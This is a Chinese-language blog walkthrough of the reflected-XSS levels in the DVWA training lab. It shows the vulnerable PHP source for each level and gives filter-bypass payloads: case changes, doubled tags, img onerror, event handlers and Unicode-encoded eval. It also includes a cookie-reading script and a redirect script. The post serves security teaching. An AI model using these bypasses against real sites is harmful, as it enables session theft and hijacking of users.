---
title:      "跨站脚本攻击（反射型）---dvwa"
description: "主要用来记录dvwa靶场 跨站脚本攻击（反射型）破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-30
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/xss(reflected)/"
categories: [ "网安" ]
---

## 跨站脚本攻击XSS简介
>跨站脚本攻击XSS，全称Cross Site Scripting，是指攻击者在有漏洞的Web页面中注入恶意的代码脚本，当受害者访问该页面时，恶意代码会在其浏览器上执行。XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的。

    用大白话来说，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。

## 利用XSS漏洞的常见用途
>①盗取用户cookies
> 
>②会话劫持
> 
>③流量劫持 
> 
>④网页挂马 
> 
>⑤DDOS攻击
>
>⑥提升权限


## 反射型（Reflected）XSS
反射型XSS是一种`非持久性XSS`，也就是攻击相对于访问者而言是`一次性`的

具体表现就是恶意脚本通过URL的方式传递给了服务器，而服务器则只是不加处理的脚本“反射”回访者的浏览器而使访问者的浏览器执行响应的脚本。


## Low 级别破解
> 查看源码
 ```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```
>没有过滤机制，只是检查下是否为空,这样就存在很明显的XSS漏洞了

输入`<script>alert(1)</script>` 可以看到会出来一个弹窗,这个就是反射型XSS的攻击，服务器并未执行这个脚本，只是因为服务器存在漏洞，使得脚本反射给了浏览器执行，通常会将恶意脚本放在URL中让用户进行执行。

![直接输入](/img/xss(reflected)/1-1.png)

`<script>alert(document.cookie)</script>` 可以把浏览器的cookie给反射出来
用于劫持流量,实现恶意跳转:`<script>document.location.href="http://www.baidu.com"</script>` 访问此链接,所访问的网站就会跳转到百度的首页

## Medium 级别破解
> 查看源码
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
```
>只是对`<script>`进行了过滤

我们可以用`<Script>`大小写来绕过弹个窗:`<Script>alert(1)</Script>`'
![直接输入](/img/xss(reflected)/2-1.png)
也可以通过双写来绕过`<scr<script>ipt>alert(1)</script>`
![直接输入](/img/xss(reflected)/2-2.png)

## High 级别破解
> 查看源码
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
```
>代码上的变化，利用正则表达式把`<script>`彻底堵死了
>但并不是只有script标签才可以插入代码，还可以通过其他方式来绕过。

#### 利用`<img>`标签绕过
    <img>标签有个功能特性，当指定图片不存在时，执行onerror后面的代码

输入`<img src='1' onerror='alert(1)'>`

![直接输入](/img/xss(reflected)/3-1.png)


#### 利用`<onmousemove>`标签绕过
    <onmousemove>标签可以监控鼠标的移动，移动时执行代码
输入`<a onmousemove='alert(1)'>`
![直接输入](/img/xss(reflected)/3-2.png)

上面两种方式，都可以绕过<sctrip>标签被正则控制的情况，如果服务器对代码中的关键字（比如alert）进行过滤的话，我们可以尝试将关键字进行编码后再插入。
不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval()来实现，eval()会将编码过的语句解码后再执行。

例如alert经过Unicode编码后就是`\u0061\u006c\u0065\u0072\u0074`

我们结合上面`<image>`标签运行下`<img src='1' onerror='eval(\u0061\u006c\u0065\u0072\u0074(1))'>`，弹窗成功
![直接输入](/img/xss(reflected)/3-3.png)





